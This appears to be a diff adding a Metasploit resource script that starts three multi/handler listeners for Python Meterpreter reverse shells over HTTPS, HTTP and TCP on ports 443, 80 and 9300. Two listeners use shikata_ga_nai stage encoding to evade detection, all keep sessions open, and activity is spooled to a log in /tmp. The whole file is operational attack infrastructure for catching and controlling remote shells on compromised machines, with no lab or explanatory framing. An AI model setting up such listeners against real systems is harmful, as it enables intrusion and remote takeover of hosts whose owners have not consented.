@@ -1,0 +1,24 @@
+spool /tmp/metasploit.log
+use exploit/multi/handler
+set PAYLOAD python/meterpreter/reverse_https
+set LHOST 0.0.0.0
+set LPORT 443
+set ExitOnSession false
+set EnableStageEncoding true
+set StageEncoder x86/shikata_ga_nai
+exploit -j -z
+use exploit/multi/handler
+set PAYLOAD python/meterpreter/reverse_http
+set LHOST 0.0.0.0
+set LPORT 80
+set ExitOnSession false
+set EnableStageEncoding true
+set StageEncoder x86/shikata_ga_nai
+exploit -j -z
+use exploit/multi/handler
+set PAYLOAD python/meterpreter/reverse_tcp_uuid
+set LHOST 0.0.0.0
+set LPORT 9300
+set ExitOnSession false
+set EnableStageEncoding false
+exploit -j -z
